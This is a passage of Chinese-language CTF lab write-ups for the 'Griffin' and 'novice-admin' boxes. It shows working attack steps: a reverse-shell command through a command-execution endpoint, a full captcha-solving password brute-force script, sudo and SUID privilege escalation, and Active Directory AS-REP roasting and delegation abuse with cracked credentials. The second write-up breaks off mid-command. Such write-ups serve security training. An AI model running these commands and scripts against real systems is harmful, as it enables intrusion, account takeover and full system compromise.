Yo, welcome to GriffinCorp, the coolest company in Quahog!
Peter Griffin’s got your back with top-notch service.
Don’t mess this up, or Lois is gonna be pissed!
```

使用`dirsearch`工具进行目录扫描，发现了`/info`和`/debug`两个路径。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u http://192.168.205.132:8080
...
[09:28:14] 403 -   23B  - /debug
[09:28:18] 200 -   49B  - /info
...
```

## **2.2 远程命令执行（RCE）**

访问`/info`路径，发现它会返回一个诊断令牌。多次访问后发现，该令牌是随机变化的。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.132:8080/info
System Info: Diagnostic token = BetaToken123
...
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.132:8080/info
System Info: Diagnostic token = CyberCorpDebug123
```

访问`/debug`路径提示缺少`token`参数。尝试将从`/info`获取的令牌作为参数提供，页面提示缺少`run`命令。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.132:8080/debug?token=CyberCorpDebug123'
Missing run command
```

这表明该端点可能存在命令执行漏洞。通过`run`参数传递`id`命令进行测试，成功执行并返回了结果。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.132:8080/debug?token=CyberCorpDebug123&amp;run=id'
uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)
```

**注意**：由于令牌是随机的，需要先访问`/info`获取有效令牌，再立即用于`/debug`端点。

## **2.3 获取反向Shell**

在Kali上设置`netcat`监听8888端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
```

利用已发现的RCE漏洞，执行一个反向shell命令。这里使用`busybox nc`来建立连接。

```bash
http://192.168.205.132:8080/debug?token=CyberCorpDebug123&amp;run=busybox%20nc%20192.168.205.128%208888%20-e%20/bin/bash
```

成功接收到反向shell，当前用户为`lois`。

```bash
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.132] 45526
id
uid=1002(lois) gid=1002(lois) groups=1002(lois),0(root)
```

随后，通过一系列命令将简易shell升级为功能完善的交互式TTY。

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

# **三、权限提升**

## **3.1 本地枚举**

获取`user.txt`中的第一个flag。

```bash
lois@Griffin:/home/lois$ cat user.txt
flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}
```

使用`sudo -l`检查`lois`用户的sudo权限。

```bash
lois@Griffin:/home/lois$ sudo -l
...
User lois may run the following commands on Griffin:
    (ALL) NOPASSWD: /usr/bin/cat /root/startup.log
```

`lois`可以免密使用`cat`命令读取`/root/startup.log`。检查网络连接情况，发现除了公网的`8080`和`22`端口外，还在本地`127.0.0.1`上监听了多个端口，包括一个`80`端口。

```bash
lois@Griffin:/opt$ ss -tnlp
State                   Recv-Q                  Send-Q               Local Address:Port
...
LISTEN                  0                       5                          0.0.0.0:8080
LISTEN                  0                       128                        127.0.0.1:80
...
```

## **3.2 端口转发与Web二次渗透**

由于`80`端口只在本地监听，我们无法直接访问。使用`socat`将本地的`80`端口转发到`8000`端口，以便从外部访问。

```bash
lois@Griffin:/opt$ socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:80 &amp;
```

访问转发后的`http://192.168.205.132:8000/`，这是一个关于'Family Guy'的网站。再次使用`dirsearch`进行目录扫描，发现`robots.txt`文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.132:8000/robots.txt
User-agent: *
Disallow: /family

...

rockyou: world's best dictionary, hands down!
```

`robots.txt`禁止访问`/family`路径，并暗示`rockyou`字典可能会派上用场。

## **3.3 登录爆破 (lois -&gt; meg)**

访问`/family`路径是一个登录页面，包含用户名、密码和验证码。页面提示`brian`用户每5次尝试后会被锁定，需要重置。

为此，编写了一个Python脚本，使用`ddddocr`库识别验证码，并结合字典对`brian`用户的密码进行爆破。脚本逻辑包括自动识别验证码、处理账户锁定以及多线程爆破。

```python
import requests
import ddddocr
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
import queue

url = 'http://192.168.205.132:8000/family/'
cap_url = 'http://192.168.205.132:8000/family/captcha.php'
rst_url = 'http://192.168.205.132:8000/family/?reset=1'
user = 'brian'
dict_file = '5000q.txt'
max_workers = 2

ocr = ddddocr.DdddOcr()
pw_q = queue.Queue()
found = queue.Queue(maxsize=1)
pr_lock = Lock()
total = 0
MAX_RETRY = 3   # 每个密码最多重试 3 次


def worker():
    global total
    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0',
        'Accept': 'text/html,*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.2',
        'Connection': 'keep-alive',
        'Referer': url,
        'Upgrade-Insecure-Requests': '1'
    })

    tries = 0
    while True:
        if not found.empty():
            return
        try:
            pw, retry = pw_q.get_nowait()
            tries += 1

            cap_img = s.get(cap_url, timeout=5).content
            cap = ocr.classification(cap_img).strip()

            if len(cap) != 4:
                if retry &lt; MAX_RETRY:
                    pw_q.put((pw, retry + 1))
                continue

            r = s.post(url, data={'username': user, 'password': pw, 'captcha': cap}, timeout=5)

            with pr_lock:
                total += 1
                n = total

            res = r.text

            # 账号被锁定
            if 'ACCOUNT TEMPORARILY LOCKED!' in res:
                with pr_lock:
                    print(f'[{n:4d}] 🚫 {pw:&lt;12} | 🔤 {cap} | 原因: 账号被锁定 → reset')
                try:
                    s.get(rst_url, timeout=5)
                except requests.RequestException:
                    pass
                if retry &lt; MAX_RETRY:
                    pw_q.put((pw, retry + 1))
                continue

            # 破解成功
            if 'Invalid security code!' not in res and 'Incorrect password!' not in res:
                found.put((user, pw, cap, n))
                with pr_lock:
                    print(f'\n[+] 🎉 破解成功！🎉\n    用户名: {user}\n    密码: {pw}\n    验证码: {cap}\n    尝试: {n}')
                return

            # 失败原因输出
            reason = '未知原因'
            if 'Invalid security code!' in res:
                reason = '验证码错误'
            elif 'Incorrect password!' in res:
                reason = '密码错误'

            with pr_lock:
                print(f'[{n:4d}] ❌ {pw:&lt;12} | 🔤 {cap} | 原因: {reason}')

        except queue.Empty:
            break
        except requests.RequestException:
            if retry &lt; MAX_RETRY:
                pw_q.put((pw, retry + 1))
        except Exception as e:
            with pr_lock:
                print(f'[!] 线程异常: {e}')


if __name__ == '__main__':
    try:
        with open(dict_file, encoding='utf-8') as f:
            for p in [x.strip() for x in f if x.strip()]:
                pw_q.put((p, 0))   # (密码, 重试次数)
    except:
        print(f'[-] 字典未找到: {dict_file}')
        exit(1)

    print(f'[*] 开始爆破 | 用户: {user} | 字典: {dict_file} | 总数: {pw_q.qsize()} | 线程: {max_workers}\n')

    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        list(ex.map(lambda _: worker(), range(max_workers)))

    if found.empty():
        print(f'\n[-] ❌ 爆破失败')
```

经过爆破，成功获得`brian`用户的密码。

```
[+] 🎉 破解成功！🎉
    用户名: brian
    密码: savannah
    验证码: 8upj
    尝试: 555
```

使用`brian:savannah`登录后，在Cookie中发现一个`auth_token`。经过分析，该token泄露了`meg`用户的凭据。

```
meg:lovelyfamily
```

使用`su`命令和该密码成功切换到`meg`用户。

```bash
lois@Griffin:/opt$ su meg
Password: lovelyfamily
meg@Griffin:~$ id
uid=1001(meg) gid=1001(meg) groups=1001(meg)
```

## **3.4 Sudo提权 (meg -&gt; peter)**

检查`meg`用户的sudo权限。

```bash
meg@Griffin:~$ sudo -l
...
User meg may run the following commands on Griffin:
    (ALL) NOPASSWD: /usr/bin/python3 /root/game.py
```

`meg`可以免密以root权限执行`/root/game.py`脚本。执行该脚本后，它会在`6666`端口上启动一个监听服务。

```bash
meg@Griffin:~$ sudo /usr/bin/python3 /root/game.py
Server listening on port 6666...
```

该服务设计了三个挑战：数学计算、凯撒密码解密和MD5哈希计算（3s时间限制），所以需要编写一个客户端脚本与该服务进行交互。

```python
import socket
import re
import hashlib

s = socket.socket()
s.connect(('192.168.205.132', 6666))

data = s.recv(4096).decode()
print(data)

match = re.search(r'\((\d+) \* (\d+)\) // (\d+)', data)
a, b, c = map(int, match.groups())
ans1 = str((a * b) // c)
s.send((ans1 + '\n').encode())

data = s.recv(4096).decode()
print(data)
s.send(b'flag{fakeflag}\n')

data = s.recv(4096).decode()
print(data)
x = re.search(r'MD5\((\d+) \+ UNIX timestamp: (\d+)\)', data)
param = x.group(1) + x.group(2)
md5_hash = hashlib.md5(param.encode()).hexdigest()
s.send((md5_hash + '\n').encode())

print(s.recv(4096).decode())
s.close()
```

成功通过所有挑战后，服务返回了一个密码。

```
Congratulations! Flag: HMV{Wow!VeryFuuuuuny!}
```

这个密码`Wow!VeryFuuuuuny!`实际上是`peter`用户的SSH密码。使用该密码成功登录`peter`账户。

```bash
┌──(pythonvenv)─(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh peter@192.168.205.132
peter@192.168.205.132's password: Wow!VeryFuuuuuny!
...
peter@Griffin:~$ id
uid=1003(peter) gid=1003(peter) groups=1003(peter)
```

## **3.5 Sudo提权 (peter -&gt; root)**

最后，检查`peter`用户的sudo权限。

```bash
peter@Griffin:~$ sudo -l
...
User peter may run the following commands on Griffin:
    (ALL) NOPASSWD: /usr/bin/mg
```

`peter`可以免密以root权限运行文本编辑器`mg`。`mg`编辑器可以通过执行外部shell命令来进行提权。

1.  创建一个脚本`/tmp/a`，内容为给`/bin/bash`添加SUID权限位，并赋予其执行权限。

    ```bash
    peter@Griffin:~$ echo 'chmod +s /bin/bash' &gt; /tmp/a
    peter@Griffin:~$ chmod +x /tmp/a
    ```

2.  以sudo权限运行`mg`。

    ```bash
    peter@Griffin:~$ sudo /usr/bin/mg
    ```

3.  在`mg`编辑器中，按`Alt-x`，输入`shell-command`并按回车。
4.  在新的提示符下，输入`/tmp/a`并回车，执行我们的脚本。
5.  按`Ctrl-x` `Ctrl-c`退出`mg`编辑器。

此时，`/bin/bash`已被设置了SUID位。使用`-p`参数运行bash以保留有效用户ID（euid）。

```bash
peter@Griffin:~$ bash -p
bash-5.0# id
uid=1003(peter) gid=1003(peter) euid=0(root) egid=0(root) groups=0(root),1003(peter)
```

成功获得root权限。读取最终的flag。

```bash
bash-5.0# cat /root/root.txt /home/lois/user.txt
flag{root-be93b7d7f0a30d5159c0460874e6e015}
flag{user-f6b63474e7cc20b0893a82beb9e3b3fd}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Griffin.html</guid><pubDate>Sat, 23 Aug 2025 14:28:39 +0000</pubDate></item><item><title>内部_novice-admin</title><link>https://7r1UMPHK.github.io/post/nei-bu-_novice-admin.html</link><description># **一、信息收集**

## **1.1 主机发现**

首先，在当前内网环境中进行主机发现，以确定潜在的攻击目标。我们使用 `arp-scan` 对本地 `eth0` 网卡所在的 `192.168.205.0/24` 网段进行扫描，寻找存活主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l      
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.132 00:0c:29:19:38:d9       VMware, Inc.
192.168.205.254 00:50:56:e9:e4:2e       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.005 seconds (127.68 hosts/sec). 4 responded
```

扫描结果显示，IP地址为 `192.168.205.132` 的主机处于活动状态，我们将其确定为本次渗透测试的目标。

## **1.2 端口与服务扫描**

为全面了解目标主机开放的服务和潜在的攻击面，我们使用 `nmap` 结合一个自定义脚本 `windowport.sh` 来进行深入的端口和服务扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat windowport.sh 
#!/bin/bash

nmap -p0-65535 $1 -oA nmapscan/ports
ports=$(grep open nmapscan/ports.nmap | awk -F '/' '{print $1}' | paste -sd ',')
nmap -p$ports -sC -sV -T4 $1 -oA nmapscan/xiports
nmap --script=vuln -p$ports $1 -oA nmapscan/vuln
```

执行该脚本对目标 `192.168.205.132` 进行扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ bash windowport.sh 192.168.205.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 22:37 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00073s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
62319/tcp open  unknown
62320/tcp open  unknown
62333/tcp open  unknown
62352/tcp open  unknown
MAC Address: 00:0C:29:19:38:D9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 104.79 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 22:39 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00027s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-23 02:39:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: novice.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: novice.com0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
62319/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
62320/tcp open  msrpc         Microsoft Windows RPC
62333/tcp open  msrpc         Microsoft Windows RPC
62352/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:0C:29:19:38:D9 (VMware)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:19:38:d9 (VMware)
|_clock-skew: -1s
| smb2-time: 
|   date: 2025-08-23T02:40:05
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.32 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 22:40 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00050s latency).

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
62319/tcp open  unknown
62320/tcp open  unknown
62333/tcp open  unknown
62352/tcp open  unknown
MAC Address: 00:0C:29:19:38:D9 (VMware)

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 123.45 seconds
```

**扫描结果分析：**

*   **服务识别**：开放了 Kerberos(88)、LDAP(389)、SMB(445)、WinRM(5985) 等多个关键端口。
*   **系统角色**：服务信息明确指出这是一台 `Microsoft Windows Active Directory LDAP` 服务器，结合其主机名 `DC` 和域名 `novice.com`，可以确定其为域控制器。
*   **攻击向量**：基于开放的服务，初步的攻击思路将围绕活动目录认证协议（Kerberos, LDAP）和文件共享服务（SMB）展开。

---

# **二、漏洞利用与初始立足点**

## **2.1 SMB匿名枚举**

从 SMB 服务入手，使用 `smbclient` 尝试对目标进行匿名访问，列出其共享文件夹。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ smbclient -L //192.168.205.132/ -N       

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      远程管理
        C$              Disk      默认共享
        IPC$            IPC       远程 IPC
        NETLOGON        Disk      Logon server share 
        nothinghere     Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.205.132 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

成功列出了多个共享，其中 `nothinghere` 看起来比较可疑。我们尝试匿名连接到这个共享并查看其内容。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ smbclient //192.168.205.132/nothinghere -N
Try 'help' to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Mon Aug 18 08:03:56 2025
  ..                                DHS        0  Mon Aug 18 08:05:08 2025
  readme.txt                          A      135  Mon Aug 18 07:57:00 2025

                12923135 blocks of size 4096. 9365851 blocks available
smb: \&gt; get readme.txt 
getting file \readme.txt of size 135 as readme.txt (13.2 KiloBytes/sec) (average 13.2 KiloBytes/sec)
smb: \&gt; exit

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat readme.txt   
It’s not about this directory — the key point is your anonymous permissions. Think about what you can do with SMB anonymous access.
```

`readme.txt` 文件的内容给出了明确的提示：关键在于利用 SMB 的匿名访问权限进行下一步操作。

## **2.2 域内用户枚举**

利用已知的 SMB 匿名登录权限（空会话），可以使用 `impacket` 工具集中的 `lookupsid.py` 脚本，通过暴力猜解 RID (Relative ID) 的方式来枚举域内的用户和组。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.132
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 192.168.205.132
[*] StringBinding ncacn_np:192.168.205.132[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3649830887-1815587496-1699028491
498: NOVICE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: NOVICE\Administrator (SidTypeUser)
501: NOVICE\Guest (SidTypeUser)
502: NOVICE\krbtgt (SidTypeUser)
512: NOVICE\Domain Admins (SidTypeGroup)
513: NOVICE\Domain Users (SidTypeGroup)
514: NOVICE\Domain Guests (SidTypeGroup)
515: NOVICE\Domain Computers (SidTypeGroup)
516: NOVICE\Domain Controllers (SidTypeGroup)
517: NOVICE\Cert Publishers (SidTypeAlias)
518: NOVICE\Schema Admins (SidTypeGroup)
519: NOVICE\Enterprise Admins (SidTypeGroup)
520: NOVICE\Group Policy Creator Owners (SidTypeGroup)
521: NOVICE\Read-only Domain Controllers (SidTypeGroup)
522: NOVICE\Cloneable Domain Controllers (SidTypeGroup)
525: NOVICE\Protected Users (SidTypeGroup)
526: NOVICE\Key Admins (SidTypeGroup)
527: NOVICE\Enterprise Key Admins (SidTypeGroup)
553: NOVICE\RAS and IAS Servers (SidTypeAlias)
571: NOVICE\Allowed RODC Password Replication Group (SidTypeAlias)
572: NOVICE\Denied RODC Password Replication Group (SidTypeAlias)
1000: NOVICE\DC$ (SidTypeUser)
1101: NOVICE\DnsAdmins (SidTypeAlias)
1102: NOVICE\DnsUpdateProxy (SidTypeGroup)
1104: NOVICE\MrRobot (SidTypeUser)
```

脚本成功枚举出了域 `NOVICE` 的 SID 以及多个用户和组，包括 `Administrator`、`krbtgt` 和一个名为 `MrRobot` 的普通用户。为了方便后续利用，我们将所有类型为 `SidTypeUser` 的用户名提取并保存到 `user` 文件中。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@192.168.205.132 2&gt;/dev/null | grep '(SidTypeUser)' | cut -d '\' -f2 | cut -d ' ' -f1 &gt; user
Password:
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat user      
Administrator
Guest
krbtgt
DC$
MrRobot
```

## **2.3 AS-REP Roasting 攻击**

&gt; **知识点**: AS-REP Roasting 是一种针对Kerberos认证的攻击。如果一个域用户的账户属性中设置了 “不需要Kerberos预身份验证” (`UF_DONT_REQUIRE_PREAUTH` is `True`)，那么任何攻击者都可以冒充该用户向KDC（密钥分发中心）请求认证票据（AS-REP）。KDC会直接返回一个用该用户密码哈希加密的TGT票据。攻击者可以截获这个票据并进行离线破解，从而获取用户明文密码。

我们利用上一步获得的用户列表，使用 `GetNPUsers.py` 脚本尝试进行 AS-REP Roasting 攻击。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py novice.com/ -usersfile user -format john -outputfile hash -no-pass -dc-ip 192.168.205.132
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC$ doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$MrRobot@NOVICE.COM:17037b58fa06936b306893c2184c444a$fdd9db20ebe37b4cd79a1847c9cb7b2cbee5fa22c21c180ad23bc22e4249b7d373d3cd31d083493258d493f0c6a2fd4e38847fff4d1b93c7d3803a754dc78e0649c7f678ff7c40a06faee8d5fbf461e4aa69769eaafaf1ddf24383126f5724027343ab0fd70dd8501a3bf9ef39b9e08c4112bab1180b2f316fd7bd3205feed3f8c0366120602d0226094881746adcda4609a5f303139c2845ee0817321575d2c9e648fff2d8f46a11f70c49e0f057bbe0ed7155a16819211dc0c20eee7c09b42c423e12df38d788b5975ed5fdf1b64b7572e4c041580475835258a4b5d474e89e3a2dbec797756d9
```

脚本的输出显示，用户 `MrRobot` 的账户存在此配置缺陷，并成功获取了其 AS-REP 哈希，已保存至 `hash` 文件中。

## **2.4 离线密码破解**

接下来，使用 `John the Ripper` 配合强大的 `rockyou.txt` 字典，对获取到的哈希进行离线暴力破解。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mrroboto12       ($krb5asrep$MrRobot@NOVICE.COM)     
1g 0:00:00:01 DONE (2025-08-22 22:50) 0.5813g/s 3110Kp/s 3110Kc/s 3110KC/s mrsbrown89..mrkonochi
Use the '--show' option to display all of the cracked passwords reliably
Session completed.
```

密码被成功破解，用户 `MrRobot` 的明文密码为 `mrroboto12`。

## **2.5 远程登录获取立足点**

利用刚刚获取的凭据，通过 `evil-winrm` 登录目标主机的 WinRM 服务（5985端口），这将为我们提供一个交互式的 PowerShell Shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ evil-winrm -i 192.168.205.132 -u 'MrRobot' -p 'mrroboto12'    
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\MrRobot\Documents&gt; whoami /all
```

成功登录，我们已经在目标系统上获得了一个初始的立足点（Foothold）。

---

# **三、权限提升**

## **3.1 权限分析**

为了规划下一步的提权路线，首先在远程Shell中执行 `whoami /all` 命令，查看当前用户 `MrRobot` 的详细权限信息。

```powershell
*Evil-WinRM* PS C:\Users\MrRobot\Documents&gt; whoami /all

用户信息
----------------

用户名         SID
============== ==============================================
novice\mrrobot S-1-5-21-3649830887-1815587496-1699028491-1104


组信息
-----------------

组名                                        类型   SID          属性
=========================================== ====== ============ ==============================
Everyone                                    已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
BUILTIN\Remote Management Users             别名   S-1-5-32-580 必需的组, 启用于默认, 启用的组
BUILTIN\Users                               别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
BUILTIN\Pre-Windows 2000 Compatible Access  别名   S-1-5-32-554 必需的组, 启用于默认, 启用的组
NT AUTHORITY\NETWORK                        已知组 S-1-5-2      必需的组, 启用于默认, 启用的组
NT AUTHORITY\Authenticated Users            已知组 S-1-5-11     必需的组, 启用于默认, 启用的组
NT AUTHORITY\This Organization              已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
NT AUTHORITY\NTLM Authentication            已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组
Mandatory Label\Medium Plus Mandatory Level 标签   S-1-16-8448


特权信息
----------------------

特权名                        描述             状态
============================= ================ ======
SeMachineAccountPrivilege     将工作站添加到域 已启用
SeChangeNotifyPrivilege       绕过遍历检查     已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集   已启用


用户声明信息
-----------------------

用户声明未知。

已在此设备上禁用对动态访问控制的 Kerberos 支持。
```

输出结果中最引人注目的一点是，用户 `novice\mrrobot` 拥有 `SeMachineAccountPrivilege` 特权。

&gt; **知识点**: `SeMachineAccountPrivilege` 特权允许持有者将计算机加入到域中。在默认的Active Directory配置下，普通域用户拥有此权限，并且最多可以将10个机器账户添加到域中。攻击者可以滥用此权限，创建一个由自己完全控制的机器账户，并以此为跳板进行后续的委派攻击，最终实现权限提升。

## **3.2 滥用机器账户配额**

我们利用 `SeMachineAccountPrivilege` 特权，使用 `addcomputer.py` 脚本以 `MrRobot` 的身份在域中添加一个名为 `NEWPC$` 的新机器账户，并为其设置一个我们已知的密码 `Password123!`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/addcomputer.py -computer-name 'NEWPC$' -computer-pass 'Password123!' -dc-ip 192.168.205.132 novice.com/MrRobot:mrroboto12
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account NEWPC$ with password Password123!.
```

机器账户创建成功，我们现在拥有了一个域内的新身份。

## **3.3 配置基于资源的约束性委派 (RBCD)**

&gt; **知识点**: 单纯创建一个机器账户并不能直接模拟管理员。我们需要配置域控制器，让它“信任”我们创建的 `NEWPC$` 账户可以代表其他用户（包括管理员）来请求服务。这个过程就是配置“基于资源的约束性委派”（RBCD）。我们通过修改域控主机对象（`DC$`）的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性，将我们控制的 `NEWPC$` 的SID添加进去，从而单向地建立信任关系。

利用 `MrRobot` 用户的权限，使用 `rbcd.py` 脚本来修改 `DC$` 的安全描述符，授予 `NEWPC$` 对 `DC$` 的委派权限。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 /usr/share/doc/python3-impacket/examples/rbcd.py -action write -delegate-to 'DC$' -delegate-from 'NEWPC$' -dc-ip 192.168.205.132 'novice.com/MrRobot:mrroboto12'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] NEWPC$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     NEWPC$       (S-1-5-21-3649830887-1815587496-1699028491-2601)
```

输出确认委派权限已成功修改，`NEWPC$` 现在可以模拟用户在 `DC$` 上进行操作了。

## **3.4 Kerberos委派攻击 (S4U2proxy)**

现在，攻击流程进入最后阶段。

1. **获取 `NEWPC$` 的 TGT**
   首先，使用 `getTGT.py` 和我们为 `NEWPC$` 设置的密码，获取其Kerberos TGT（票据授予票据）。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ python3 /usr/share/doc/python3-impacket/examples/getTGT.py -dc-ip 192.168.205.132 novice.com/NEWPC$:Password123!
   Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
   
   [*] Saving ticket in NEWPC$.ccache
   ```

2. **请求模拟管理员的服务票据**
   接下来，利用上一步获取的 TGT，通过 Kerberos S4U2proxy 扩展协议，请求一张可以**模拟 `Administrator` 用户**身份、并用于访问域控 `cifs`（文件共享）服务的服务票据 (ST)。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
